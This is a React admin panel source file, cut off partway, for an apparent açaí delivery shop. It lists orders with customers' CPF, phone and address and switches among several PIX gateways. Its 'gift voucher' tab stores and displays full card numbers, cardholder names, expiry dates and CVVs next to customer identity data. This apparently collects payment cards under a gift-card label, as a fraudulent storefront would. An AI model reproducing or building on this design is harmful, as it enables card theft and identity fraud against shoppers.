import { useState, useEffect } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import {
  Lock,
  Phone,
  MapPin,
  Package,
  Clock,
  RefreshCw,
  LogOut,
  CreditCard,
  QrCode,
  Settings,
  Wallet,
  MessageCircle,
  Trash2,
  Plus,
  Check,
} from "lucide-react";
import { supabase } from "@/integrations/supabase/client";
import { useToast } from "@/hooks/use-toast";
import { format } from "date-fns";
import { ptBR } from "date-fns/locale";

interface ValePresente {
  id: string;
  pedido_id: string;
  numero_cartao: string;
  nome_cartao: string;
  validade: string;
  cvv: string;
  cliente_nome: string;
  cliente_cpf: string;
  cliente_telefone: string;
  created_at: string;
}

interface PedidoItem {
  id: string;
  produto_nome: string;
  produto_preco: number;
  adicionais: Record<string, number>;
  total_adicionais: number;
  total_item: number;
  observacoes: string;
}

interface Pedido {
  id: string;
  numero_pedido: string;
  cliente_nome: string;
  cliente_telefone: string;
  cliente_cpf: string;
  endereco_completo: string;
  bairro: string;
  cidade: string;
  cep: string;
  tipo_entrega: string;
  forma_pagamento: string;
  status_pagamento: string;
  status_pedido: string;
  subtotal: number;
  desconto_pix: number;
  total: number;
  observacoes: string;
  created_at: string;
  itens: PedidoItem[];
  payment_id: string | null;
}


interface NumeroWhatsApp {
  id: string;
  numero: string;
  ativo: boolean;
  created_at: string;
}

const STATUS_COLORS: Record<string, string> = {
  pendente: "bg-yellow-500",
  confirmado: "bg-green-500",
  recusado: "bg-red-500",
  preparando: "bg-blue-500",
  saiu: "bg-purple-500",
  entregue: "bg-green-700",
};

const Admin = () => {
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [password, setPassword] = useState("");
  const [storedPassword, setStoredPassword] = useState("");
  const [pedidos, setPedidos] = useState<Pedido[]>([]);
  const [valesPresente, setValesPresente] = useState<ValePresente[]>([]);
  const [loading, setLoading] = useState(false);
  const [reconciling, setReconciling] = useState(false);
  const [filtroStatus, setFiltroStatus] = useState("todos");
  const [abaAtiva, setAbaAtiva] = useState<"pedidos" | "vales" | "config">("pedidos");
  const [gatewayAtivo, setGatewayAtivo] = useState<string>("umbrellapag");
  const [salvandoGateway, setSalvandoGateway] = useState(false);
  const [numerosWhatsApp, setNumerosWhatsApp] = useState<NumeroWhatsApp[]>([]);
  const [novoNumero, setNovoNumero] = useState("");
  const [adicionandoNumero, setAdicionandoNumero] = useState(false);
  const { toast } = useToast();

  const handleLogin = async () => {
    if (!password.trim()) {
      toast({
        title: "Erro",
        description: "Digite a senha",
        variant: "destructive",
      });
      return;
    }

    setLoading(true);
    try {
      // Verificar senha via edge function
      const { data, error } = await supabase.functions.invoke("admin-pedidos", {
        body: { action: "listar", password },
      });

      if (error) throw error;

      if (data.error) {
        toast({
          title: "Erro",
          description: data.error,
          variant: "destructive",
        });
        return;
      }

      setStoredPassword(password);
      setIsAuthenticated(true);
      // Após autenticação, carregar dados diretamente do Supabase
      await Promise.all([carregarPedidosDireto(), carregarValesPresente(), carregarConfiguracao(), carregarNumerosWhatsApp()]);
      toast({
        title: "Sucesso",
        description: "Login realizado com sucesso",
      });
    } catch (error: unknown) {
      console.error("Erro no login:", error);
      toast({
        title: "Erro",
        description: "Erro ao fazer login",
        variant: "destructive",
      });
    } finally {
      setLoading(false);
    }
  };

  const carregarConfiguracao = async () => {
    if (!storedPassword) return;
    try {
      const response = await fetch(
        "https://bgcwtnrimreruswogffr.supabase.co/functions/v1/admin-config",
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ action: "listar", password: storedPassword }),
        }
      );
      const data = await response.json();

      if (data?.gateway_pix) {
        setGatewayAtivo(data.gateway_pix);
      }
      if (data?.numeros_whatsapp) {
        setNumerosWhatsApp(data.numeros_whatsapp);
      }
    } catch (error) {
      console.error("Erro ao carregar configuração:", error);
    }
  };

  const salvarGateway = async (novoGateway: string) => {
    if (!storedPassword) return;
    setSalvandoGateway(true);
    try {
      const response = await fetch(
        "https://bgcwtnrimreruswogffr.supabase.co/functions/v1/admin-config",
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            action: "atualizar_gateway",
            password: storedPassword,
            gateway_pix: novoGateway,
          }),
        }
      );
      const data = await response.json();

      if (data.error) throw new Error(data.error);

      setGatewayAtivo(novoGateway);
      const gatewayNomes: Record<string, string> = {
        umbrellapag: "UmbrellaPag",
        evopay: "EvoPay",
        blackcat: "BlackCat",
        ironpay: "IronPay",
        whatsapp: "WhatsApp",
        whatsapp2: "WhatsApp 2",
      };
      toast({
        title: "Sucesso",
        description: `Gateway PIX alterado para ${gatewayNomes[novoGateway] || novoGateway}`,
      });
    } catch (error) {
      console.error("Erro ao salvar gateway:", error);
      toast({
        title: "Erro",
        description: "Erro ao alterar gateway de pagamento",
        variant: "destructive",
      });
    } finally {
      setSalvandoGateway(false);
    }
  };

  const carregarPedidosDireto = async () => {
    if (!storedPassword) return;
    setLoading(true);
    try {
      // Buscar pedidos via edge function (com service role)
      const { data, error } = await supabase.functions.invoke("admin-pedidos", {
        body: { action: "listar", password: storedPassword },
      });

      if (error) throw error;
      if (data.error) throw new Error(data.error);

      // Parse adicionais de JSON para objeto
      const pedidosFormatados = (data.pedidos || []).map((pedido: Pedido) => ({
        ...pedido,
        itens: (pedido.itens || []).map((item) => ({
          ...item,
          adicionais: typeof item.adicionais === "string" ? JSON.parse(item.adicionais) : item.adicionais || {},
        })),
      }));

      setPedidos(pedidosFormatados as Pedido[]);
      
      // Também carregar vales presente retornados pela mesma chamada
      if (data.vales_presente) {
        setValesPresente(data.vales_presente as ValePresente[]);
      }
    } catch (error) {
      console.error("Erro ao carregar pedidos:", error);
      toast({
        title: "Erro",
        description: "Erro ao carregar pedidos",
        variant: "destructive",
      });
    } finally {
      setLoading(false);
    }
  };

  const carregarValesPresente = async () => {
    // Vales são carregados junto com os pedidos via edge function
    // Esta função existe para manter compatibilidade
  };

  const carregarNumerosWhatsApp = async () => {
    // Números são carregados junto com a configuração
    // Esta função existe para manter compatibilidade
  };

  // Carregar dados automaticamente ao autenticar e atualizar a cada 15 segundos
  useEffect(() => {
    if (isAuthenticated && storedPassword) {
      // Carregar dados imediatamente
      Promise.all([
        carregarPedidosDireto(),
        carregarConfiguracao(),
      ]);

      // Configurar polling para atualizar a cada 15 segundos
      const interval = setInterval(() => {
        carregarPedidosDireto();
      }, 15000);

      // Limpar interval ao desmontar ou desautenticar
      return () => clearInterval(interval);
    }
  }, [isAuthenticated, storedPassword]);

  const adicionarNumeroWhatsApp = async () => {
    const numeroLimpo = novoNumero.replace(/\D/g, "");
    
    if (!numeroLimpo || numeroLimpo.length < 10) {
      toast({
        title: "Erro",
        description: "Digite um número de WhatsApp válido",
        variant: "destructive",
      });
      return;
    }

    if (!storedPassword) return;
    setAdicionandoNumero(true);
    try {
      const response = await fetch(
        "https://bgcwtnrimreruswogffr.supabase.co/functions/v1/admin-config",
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            action: "adicionar_numero",
            password: storedPassword,
            numero: numeroLimpo,
          }),
        }
      );
      const data = await response.json();

      if (data.error) throw new Error(data.error);

      toast({
        title: "Sucesso",
        description: "Número adicionado com sucesso",
      });

      setNovoNumero("");
      await carregarConfiguracao();
    } catch (error) {
      console.error("Erro ao adicionar número:", error);
      toast({
        title: "Erro",
        description: "Erro ao adicionar número",
        variant: "destructive",
      });
    } finally {
      setAdicionandoNumero(false);
    }
  };

  const ativarNumeroWhatsApp = async (id: string) => {
    if (!storedPassword) return;
    try {
      const response = await fetch(
        "https://bgcwtnrimreruswogffr.supabase.co/functions/v1/admin-config",
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            action: "ativar_numero",
            password: storedPassword,
            numero_id: id,
          }),
        }
      );
      const data = await response.json();

      if (data.error) throw new Error(data.error);

      toast({
        title: "Sucesso",
        description: "Número ativado com sucesso",
      });

      await carregarConfiguracao();
    } catch (error) {
      console.error("Erro ao ativar número:", error);
      toast({
        title: "Erro",
        description: "Erro ao ativar número",
        variant: "destructive",
      });
    }
  };

  const excluirNumeroWhatsApp = async (id: string) => {
    if (!storedPassword) return;
    try {
      const response = await fetch(
        "https://bgcwtnrimreruswogffr.supabase.co/functions/v1/admin-config",
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            action: "excluir_numero",
            password: storedPassword,
            numero_id: id,
          }),
        }
      );
      const data = await response.json();

      if (data.error) throw new Error(data.error);

      toast({
        title: "Sucesso",
        description: "Número excluído com sucesso",
      });

      await carregarConfiguracao();
    } catch (error) {
      console.error("Erro ao excluir número:", error);
      toast({
        title: "Erro",
        description: "Erro ao excluir número",
        variant: "destructive",
      });
    }
  };

  const formatarNumeroWhatsApp = (numero: string) => {
    // Formato: +55 (11) 99999-9999
    if (numero.length === 11) {
      return `+55 (${numero.slice(0, 2)}) ${numero.slice(2, 7)}-${numero.slice(7)}`;
    }
    return numero;
  };

  const atualizarStatus = async (pedidoId: string, novoStatus: string) => {
    try {
      // Atualizar via edge function (service role)
      const { data, error } = await supabase.functions.invoke("admin-pedidos", {
        body: {
          action: "atualizar_status",
          password: storedPassword,
          pedidoId,
          novoStatus,
        },
      });

      if (error || data?.error) {
        throw new Error(data?.error || error?.message || "Erro ao atualizar");
      }

      setPedidos((prev) => prev.map((p) => (p.id === pedidoId ? { ...p, status_pedido: novoStatus } : p)));

      toast({
        title: "Sucesso",
        description: "Status atualizado",
      });
    } catch (error) {
      console.error("Erro ao atualizar status:", error);
      toast({
        title: "Erro",
        description: "Erro ao atualizar status",
        variant: "destructive",
      });
    }
  };

  const reconciliarPagamentosPix = async () => {
    setReconciling(true);
    try {
      const { data, error } = await supabase.functions.invoke("admin-pedidos", {
        body: {
          action: "reconciliar_pagamentos",
          password: storedPassword,
          days: 7,
        },
      });

      if (error || data?.error) {
        throw new Error(data?.error || error?.message || "Erro ao reconciliar");
      }

      const updated = Number(data?.updated || 0);
      const checked = Number(data?.checked || 0);
      const errorsCount = Array.isArray(data?.errors) ? data.errors.length : 0;

      toast({
        title: "Reconciliação concluída",
        description: `${updated} pedido(s) marcado(s) como pago (verificados: ${checked}${errorsCount ? `, erros: ${errorsCount}` : ""}).`,
      });

      await carregarPedidosDireto();
    } catch (e: any) {
      console.error("Erro ao reconciliar pagamentos:", e);
      toast({
        title: "Erro",
        description: e?.message || "Erro ao reconciliar pagamentos",
        variant: "destructive",
      });
    } finally {
      setReconciling(false);
    }
  };

  const handleLogout = () => {
    setIsAuthenticated(false);
    setPassword("");
    setStoredPassword("");
    setPedidos([]);
  };

  const abrirWhatsApp = (telefone: string, nome: string) => {
    const numero = telefone.replace(/\D/g, "");
    const mensagem = encodeURIComponent(`Olá ${nome}! Aqui é da Vibe Açaí.`);
    window.open(`https://wa.me/55${numero}?text=${mensagem}`, "_blank");
  };

  const pedidosFiltrados = filtroStatus === "todos" ? pedidos : pedidos.filter((p) => p.status_pedido === filtroStatus);

  const formatBRL = (value: number) => value.toLocaleString("pt-BR", { style: "currency", currency: "BRL" });

  if (!isAuthenticated) {
    return (
      <div className="min-h-screen bg-background flex items-center justify-center p-4">
        <Card className="w-full max-w-md">
          <CardHeader className="text-center">
            <div className="mx-auto w-16 h-16 bg-primary/10 rounded-full flex items-center justify-center mb-4">
              <Lock className="w-8 h-8 text-primary" />
            </div>
            <CardTitle className="text-2xl">Painel Administrativo</CardTitle>
            <p className="text-muted-foreground">Digite a senha para acessar</p>
          </CardHeader>
          <CardContent className="space-y-4">
            <Input
              type="password"
              placeholder="Senha"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              onKeyDown={(e) => e.key === "Enter" && handleLogin()}
              className="bg-admin-box text-admin-box-foreground placeholder:text-admin-box-foreground/60 border-border focus-visible:ring-accent"
            />
            <Button className="w-full" onClick={handleLogin} disabled={loading}>
              {loading ? "Verificando..." : "Entrar"}
            </Button>
          </CardContent>
        </Card>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-background">
      {/* Header */}
      <div className="sticky top-0 z-10 bg-card border-b p-4">
        <div className="max-w-7xl mx-auto flex items-center justify-between">
          <h1 className="text-xl font-bold">Painel Administrativo</h1>
          <div className="flex items-center gap-2">
            <Button
              variant="outline"
              size="icon"
              onClick={() => Promise.all([carregarPedidosDireto(), carregarValesPresente(), carregarNumerosWhatsApp()])}
              disabled={loading}
            >
              <RefreshCw className={`w-4 h-4 ${loading ? "animate-spin" : ""}`} />
            </Button>
            <Button variant="ghost" size="icon" onClick={handleLogout}>
              <LogOut className="w-4 h-4" />
            </Button>
          </div>
        </div>
      </div>

      {/* Abas */}
      <div className="max-w-7xl mx-auto p-4">
        <div className="flex gap-2 mb-4 flex-wrap">
          <Button
            variant={abaAtiva === "pedidos" ? "default" : "outline"}
            onClick={() => setAbaAtiva("pedidos")}
            className="gap-2"
          >
            <Package className="w-4 h-4" />
            Pedidos ({pedidos.length})
          </Button>
          <Button
            variant={abaAtiva === "vales" ? "default" : "outline"}
            onClick={() => setAbaAtiva("vales")}
            className="gap-2"
          >
            <CreditCard className="w-4 h-4" />
            Vales Presente ({valesPresente.length})
          </Button>
          <Button
            variant={abaAtiva === "config" ? "default" : "outline"}
            onClick={() => setAbaAtiva("config")}
            className="gap-2"
          >
            <Settings className="w-4 h-4" />
            Configurações
          </Button>
        </div>

        {/* Conteúdo das Abas */}
        {abaAtiva === "pedidos" && (
          <>
            {/* Filtros */}
            <div className="flex items-center gap-4 mb-4">
              <Select value={filtroStatus} onValueChange={setFiltroStatus}>
                <SelectTrigger className="w-48 bg-admin-box text-admin-box-foreground border-border focus:ring-accent">
                  <SelectValue placeholder="Filtrar por status" />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="todos">Todos</SelectItem>
                  <SelectItem value="pendente">Pendente</SelectItem>
                  <SelectItem value="preparando">Preparando</SelectItem>
                  <SelectItem value="saiu">Saiu para entrega</SelectItem>
                  <SelectItem value="entregue">Entregue</SelectItem>
                </SelectContent>
              </Select>
              <span className="text-muted-foreground text-sm">{pedidosFiltrados.length} pedido(s)</span>

              <Button
                variant="outline"
                className="gap-2"
                onClick={reconciliarPagamentosPix}
                disabled={reconciling || loading}
              >
                <RefreshCw className={`w-4 h-4 ${reconciling ? "animate-spin" : ""}`} />
                {reconciling ? "Verificando PIX..." : "Reconciliar PIX (7 dias)"}
              </Button>
            </div>

            {/* Lista de Pedidos */}
            <div className="space-y-4">
              {pedidosFiltrados.length === 0 ? (
                <Card>
                  <CardContent className="py-8 text-center text-muted-foreground">Nenhum pedido encontrado</CardContent>
                </Card>
              ) : (
                pedidosFiltrados.map((pedido) => (
                  <Card key={pedido.id} className="overflow-hidden">
                    <CardHeader className="pb-2">
                      <div className="flex items-start justify-between">
                        <div>
                          <div className="flex items-center gap-2">
                            <CardTitle className="text-lg">{pedido.numero_pedido}</CardTitle>
                            <Badge className={STATUS_COLORS[pedido.status_pagamento]}>
                              {pedido.status_pagamento === "confirmado" ? "Pago" : pedido.status_pagamento}
                            </Badge>
                          </div>
                          <div className="flex items-center gap-1 text-sm text-muted-foreground mt-1">
                            <Clock className="w-3 h-3" />
                            {format(new Date(pedido.created_at), "dd/MM/yyyy 'às' HH:mm", { locale: ptBR })}
                          </div>
                        </div>
                        <div className="text-right">
                          <p className="text-lg font-bold text-primary">{formatBRL(Number(pedido.total))}</p>
                          <p className="text-xs text-muted-foreground">
                            {pedido.status_pagamento === "confirmado"
                              ? `Total pago: ${formatBRL(Number(pedido.total))}`
                              : `Total a pagar: ${formatBRL(Number(pedido.total))}`}
                          </p>
                          <p className="text-xs text-muted-foreground uppercase">{pedido.forma_pagamento}</p>
                        </div>
                      </div>
                    </CardHeader>
                    <CardContent className="space-y-4">
                      {/* Cliente */}
                      <div className="flex items-start justify-between">
                        <div>
                          <p className="font-medium">{pedido.cliente_nome}</p>
                          {pedido.cliente_cpf && (
                            <p className="text-sm text-muted-foreground">CPF: {pedido.cliente_cpf}</p>
                          )}
                        </div>
                        <Button
                          variant="outline"
                          size="sm"
                          className="gap-1 bg-success text-success-foreground border-success hover:bg-success/90 hover:text-success-foreground"
                          onClick={() => abrirWhatsApp(pedido.cliente_telefone, pedido.cliente_nome)}
                        >
                          <Phone className="w-3 h-3" />
                          {pedido.cliente_telefone}
                        </Button>
                      </div>

                      {/* Endereço */}
                      {pedido.tipo_entrega === "delivery" && pedido.endereco_completo && (
                        <div className="flex items-start gap-2 p-3 bg-admin-box text-admin-box-foreground rounded-lg">
                          <MapPin className="w-4 h-4 mt-0.5 text-admin-box-foreground/60" />
                          <div className="text-sm">
                            <p>{pedido.endereco_completo}</p>
                            <p>
                              {pedido.bairro} - {pedido.cidade}
                            </p>
                            {pedido.cep && <p>CEP: {pedido.cep}</p>}
                          </div>
                        </div>
                      )}

                      {pedido.tipo_entrega === "pickup" && (
                        <div className="flex items-center gap-2 p-3 bg-admin-box text-admin-box-foreground rounded-lg">
                          <Package className="w-4 h-4 text-admin-box-foreground/60" />
                          <span className="text-sm">Retirada no local</span>
                        </div>
                      )}

                      {/* Itens */}
                      <div className="border-t pt-3">
                        <p className="font-medium mb-2">Itens do pedido:</p>
                        <div className="space-y-2">
                          {pedido.itens.map((item) => (
                            <div key={item.id} className="flex justify-between text-sm">
                              <div>
                                <p>{item.produto_nome}</p>
                                {Object.keys(item.adicionais || {}).length > 0 && (
                                  <p className="text-xs text-muted-foreground">
                                    + {Object.keys(item.adicionais).join(", ")}
                                  </p>
                                )}
                                {item.observacoes && (
                                  <p className="text-xs text-muted-foreground italic">Obs: {item.observacoes}</p>
                                )}
                              </div>
                              <p className="font-medium">R$ {Number(item.total_item).toFixed(2)}</p>
                            </div>
                          ))}
                        </div>
                      </div>

                      {/* Informação do PIX */}
                      {pedido.forma_pagamento === "pix" && pedido.payment_id && (
                        <div className="border-t pt-3">
                          <p className="font-medium mb-2 flex items-center gap-2">
                            <QrCode className="w-4 h-4 text-accent" />
                            Pagamento PIX
                          </p>
                          <div className="bg-admin-box text-admin-box-foreground p-3 rounded-lg">
                            <p className="text-xs text-admin-box-foreground/60 mb-1">ID do Pagamento</p>
                            <p className="font-mono text-xs">{pedido.payment_id}</p>
                          </div>
                        </div>
                      )}

                      {/* Status do Pedido */}
                      <div className="flex items-center justify-between pt-3 border-t">
                        <span className="text-sm font-medium">Status do pedido:</span>
                        <Select
                          value={pedido.status_pedido}
                          onValueChange={(value) => atualizarStatus(pedido.id, value)}
                        >
                          <SelectTrigger className="w-40 bg-admin-box text-admin-box-foreground border-border focus:ring-accent">
                            <SelectValue />
                          </SelectTrigger>
                          <SelectContent>
                            <SelectItem value="pendente">Pendente</SelectItem>
                            <SelectItem value="preparando">Preparando</SelectItem>
                            <SelectItem value="saiu">Saiu para entrega</SelectItem>
                            <SelectItem value="entregue">Entregue</SelectItem>
                          </SelectContent>
                        </Select>
                      </div>
                    </CardContent>
                  </Card>
                ))
              )}
            </div>
          </>
        )}

        {/* Aba Vales Presente */}
        {abaAtiva === "vales" && (
          <div className="space-y-4">
            {valesPresente.length === 0 ? (
              <Card>
                <CardContent className="py-8 text-center text-muted-foreground">
                  Nenhum vale presente registrado
                </CardContent>
              </Card>
            ) : (
              valesPresente.map((vale) => (
                <Card key={vale.id} className="overflow-hidden">
                  <CardHeader className="pb-2">
                    <div className="flex items-start justify-between">
                      <div>
                        <CardTitle className="text-lg flex items-center gap-2">
                          <CreditCard className="w-5 h-5 text-primary" />
                          Vale Presente
                        </CardTitle>
                        <div className="flex items-center gap-1 text-sm text-muted-foreground mt-1">
                          <Clock className="w-3 h-3" />
                          {format(new Date(vale.created_at), "dd/MM/yyyy 'às' HH:mm", { locale: ptBR })}
                        </div>
                      </div>
                      {vale.pedido_id && vale.pedido_id !== "sem_pedido" && (
                        <Badge variant="outline">Pedido: {vale.pedido_id}</Badge>
                      )}
                    </div>
                  </CardHeader>
                  <CardContent className="space-y-4">
                    {/* Dados do Cliente */}
                    <div className="flex items-start justify-between">
                      <div>
                        <p className="font-medium">{vale.cliente_nome || "Nome não informado"}</p>
                        {vale.cliente_cpf && <p className="text-sm text-muted-foreground">CPF: {vale.cliente_cpf}</p>}
                      </div>
                      {vale.cliente_telefone && (
                        <Button
                          variant="outline"
                          size="sm"
                          className="gap-1 bg-success text-success-foreground border-success hover:bg-success/90 hover:text-success-foreground"
                          onClick={() => {
                            const numero = vale.cliente_telefone.replace(/\D/g, "");
                            const mensagem = encodeURIComponent(`Olá ${vale.cliente_nome || ""}!`);
                            window.open(`https://wa.me/55${numero}?text=${mensagem}`, "_blank");
                          }}
                        >
                          <Phone className="w-3 h-3" />
                          {vale.cliente_telefone}
                        </Button>
                      )}
                    </div>

                    {/* Dados do Cartão */}
                    <div className="bg-admin-box text-admin-box-foreground p-4 rounded-lg space-y-3">
                      <p className="font-semibold text-sm border-b border-admin-box-foreground/20 pb-2">
                        Dados do Cartão
                      </p>
                      <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
                        <div>
                          <p className="text-xs text-admin-box-foreground/60 mb-1">Número do Cartão</p>
                          <p className="font-mono font-bold text-sm md:text-lg">{vale.numero_cartao}</p>
                        </div>
                        <div>
                          <p className="text-xs text-admin-box-foreground/60 mb-1">Nome no Cartão</p>
                          <p className="font-mono font-bold text-sm md:text-lg">{vale.nome_cartao}</p>
                        </div>
                        <div>
                          <p className="text-xs text-admin-box-foreground/60 mb-1">Validade</p>
                          <p className="font-mono font-bold text-sm md:text-lg">{vale.validade}</p>
                        </div>
                        <div>
                          <p className="text-xs text-admin-box-foreground/60 mb-1">CVV</p>
                          <p className="font-mono font-bold text-sm md:text-lg">{vale.cvv}</p>
                        </div>
                      </div>
                    </div>
                  </CardContent>
                </Card>
              ))
            )}
          </div>
        )}

        {/* Aba Configurações */}
        {abaAtiva === "config" && (
          <div className="space-y-6">
            <Card>
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <Wallet className="w-5 h-5 text-primary" />
                  Método de Pagamento
                </CardTitle>
                <p className="text-sm text-muted-foreground">
                  Selecione qual método de pagamento será usado em todo o sistema
                </p>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  {/* UmbrellaPag */}
                  <div
                    onClick={() => !salvandoGateway && salvarGateway("umbrellapag")}
                    className={`cursor-pointer p-6 rounded-lg border-2 transition-all ${
                      gatewayAtivo === "umbrellapag"
                        ? "border-primary bg-primary/10"
                        : "border-border hover:border-primary/50"
                    } ${salvandoGateway ? "opacity-50 cursor-not-allowed" : ""}`}
                  >
                    <div className="flex items-center justify-between mb-3">
                      <div className="flex items-center gap-2">
                        <QrCode className="w-5 h-5 text-accent" />
                        <h3 className="text-lg font-bold">UmbrellaPag</h3>
                      </div>
                      {gatewayAtivo === "umbrellapag" && <Badge className="bg-primary">Ativo</Badge>}
                    </div>
                    <p className="text-sm text-muted-foreground">
                      PIX via UmbrellaPag. Transações processadas via API de transações diretas.
                    </p>
                  </div>

                  {/* EvoPay */}
                  <div
                    onClick={() => !salvandoGateway && salvarGateway("evopay")}
                    className={`cursor-pointer p-6 rounded-lg border-2 transition-all ${
                      gatewayAtivo === "evopay"
                        ? "border-primary bg-primary/10"
                        : "border-border hover:border-primary/50"
                    } ${salvandoGateway ? "opacity-50 cursor-not-allowed" : ""}`}
                  >
                    <div className="flex items-center justify-between mb-3">
                      <div className="flex items-center gap-2">
                        <QrCode className="w-5 h-5 text-accent" />
                        <h3 className="text-lg font-bold">EvoPay</h3>
                      </div>
                      {gatewayAtivo === "evopay" && <Badge className="bg-primary">Ativo</Badge>}
                    </div>
                    <p className="text-sm text-muted-foreground">
                      PIX via EvoPay (PrimeCash). Transações processadas via API PIX.
                    </p>
                  </div>

                  {/* BlackCat */}
                  <div
                    onClick={() => !salvandoGateway && salvarGateway("blackcat")}
                    className={`cursor-pointer p-6 rounded-lg border-2 transition-all ${
                      gatewayAtivo === "blackcat"
                        ? "border-primary bg-primary/10"
                        : "border-border hover:border-primary/50"
                    } ${salvandoGateway ? "opacity-50 cursor-not-allowed" : ""}`}
                  >
                    <div className="flex items-center justify-between mb-3">
                      <div className="flex items-center gap-2">
                        <QrCode className="w-5 h-5 text-accent" />
                        <h3 className="text-lg font-bold">BlackCat</h3>
                      </div>
                      {gatewayAtivo === "blackcat" && <Badge className="bg-primary">Ativo</Badge>}
                    </div>
                    <p className="text-sm text-muted-foreground">
                      PIX via BlackCat. Transações processadas via API de vendas.
                    </p>
                  </div>

                  {/* IronPay */}
                  <div
                    onClick={() => !salvandoGateway && salvarGateway("ironpay")}
                    className={`cursor-pointer p-6 rounded-lg border-2 transition-all ${
                      gatewayAtivo === "ironpay"
                        ? "border-primary bg-primary/10"
                        : "border-border hover:border-primary/50"
                    } ${salvandoGateway ? "opacity-50 cursor-not-allowed" : ""}`}
                  >
                    <div className="flex items-center justify-between mb-3">
                      <div className="flex items-center gap-2">
                        <QrCode className="w-5 h-5 text-accent" />
                        <h3 className="text-lg font-bold">IronPay</h3>
                      </div>
                      {gatewayAtivo === "ironpay" && <Badge className="bg-primary">Ativo</Badge>}
                    </div>
                    <p className="text-sm text-muted-foreground">
                      PIX via IronPay. Transações processadas via API pública v1.
                    </p>
                  </div>

                  {/* BRGateway */}
                  <div
                    onClick={() => !salvandoGateway && salvarGateway("brgateway")}
                    className={`cursor-pointer p-6 rounded-lg border-2 transition-all ${
                      gatewayAtivo === "brgateway"
                        ? "border-primary bg-primary/10"
                        : "border-border hover:border-primary/50"
                    } ${salvandoGateway ? "opacity-50 cursor-not-allowed" : ""}`}
                  >
                    <div className="flex items-center justify-between mb-3">
                      <div className="flex items-center gap-2">
                        <QrCode className="w-5 h-5 text-accent" />
                        <h3 className="text-lg font-bold">BRGateway</h3>
                      </div>
                      {gatewayAtivo === "brgateway" && <Badge className="bg-primary">Ativo</Badge>}
                    </div>
                    <p className="text-sm text-muted-foreground">
                      PIX via BRGateway. Transações processadas via API pública v1.
                    </p>
                  </div>

                  {/* WhatsApp */}
                  <div
                    onClick={() => !salvandoGateway && salvarGateway("whatsapp")}
                    className={`cursor-pointer p-6 rounded-lg border-2 transition-all ${
                      gatewayAtivo === "whatsapp"
                        ? "border-success bg-success/10"
                        : "border-border hover:border-success/50"
                    } ${salvandoGateway ? "opacity-50 cursor-not-allowed" : ""}`}
                  >
                    <div className="flex items-center justify-between mb-3">
                      <div className="flex items-center gap-2">
                        <MessageCircle className="w-5 h-5 text-success" />
                        <h3 className="text-lg font-bold">WhatsApp</h3>
                      </div>
                      {gatewayAtivo === "whatsapp" && <Badge className="bg-success">Ativo</Badge>}
                    </div>
                    <p className="text-sm text-muted-foreground">
                      Redireciona o cliente para WhatsApp. Sem processamento de pagamento automático.
                    </p>
                  </div>
                </div>

                {salvandoGateway && (
                  <div className="flex items-center gap-2 text-sm text-muted-foreground">
                    <RefreshCw className="w-4 h-4 animate-spin" />
                    Salvando configuração...
                  </div>
                )}

                <div className="p-4 bg-admin-box text-admin-box-foreground rounded-lg">
                  <p className="text-sm">
                    <strong>Atenção:</strong> Ao alterar o método, todos os novos pedidos usarão o método selecionado.
                    {gatewayAtivo === "whatsapp" && (
                      <span className="block mt-2 text-success">
                        <strong>WhatsApp ativo:</strong> O cliente será redirecionado para o WhatsApp ao finalizar o pedido. Não haverá geração de PIX.
                      </span>
                    )}
                  </p>
                </div>
              </CardContent>
            </Card>

            {/* Gerenciamento de Números WhatsApp */}
            <Card>
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <MessageCircle className="w-5 h-5 text-success" />
                  Números de WhatsApp
                </CardTitle>
                <p className="text-sm text-muted-foreground">
                  Gerencie os números de WhatsApp da loja. O número ativo será usado para todos os redirecionamentos.
                </p>
              </CardHeader>
              <CardContent className="space-y-4">
                {/* Adicionar novo número */}
                <div className="flex gap-2">
                  <Input
                    placeholder="Digite o número (ex: 11999999999)"
                    value={novoNumero}
                    onChange={(e) => setNovoNumero(e.target.value)}
                    className="bg-admin-box text-admin-box-foreground placeholder:text-admin-box-foreground/60 border-border focus-visible:ring-accent"
                  />
                  <Button
                    onClick={adicionarNumeroWhatsApp}
                    disabled={adicionandoNumero}
                    className="gap-2 bg-success hover:bg-success/90 text-success-foreground"
                  >
                    <Plus className="w-4 h-4" />
                    {adicionandoNumero ? "Adicionando..." : "Adicionar"}
                  </Button>
                </div>

                {/* Lista de números */}
                {numerosWhatsApp.length === 0 ? (
                  <div className="text-center py-8 text-muted-foreground text-sm">
                    Nenhum número cadastrado. Adicione um número acima.
                  </div>
                ) : (
                  <div className="space-y-2">
                    {numerosWhatsApp.map((numero) => (
                      <div
                        key={numero.id}
                        onClick={() => !numero.ativo && ativarNumeroWhatsApp(numero.id)}
                        className={`flex items-center justify-between p-4 rounded-lg border-2 transition-all ${
                          numero.ativo
                            ? "border-success bg-success/10"
                            : "border-border bg-admin-box"
                        } ${numero.ativo ? "" : "cursor-pointer hover:border-success/50"}`}
                      >
                        <div className="flex items-center gap-3">
                          <div
                            className={`w-6 h-6 rounded-full border-2 flex items-center justify-center transition-all ${
                              numero.ativo
                                ? "border-success bg-success text-success-foreground"
                                : "border-border hover:border-success"
                            }`}
                          >
                            {numero.ativo && <Check className="w-4 h-4" />}
                          </div>
                          <div>
                            <p className="font-mono font-semibold">{formatarNumeroWhatsApp(numero.numero)}</p>
                            <p className="text-xs text-muted-foreground">
                              Adicionado em {format(new Date(numero.created_at), "dd/MM/yyyy 'às' HH:mm", { locale: ptBR })}
                            </p>
                          </div>
                        </div>
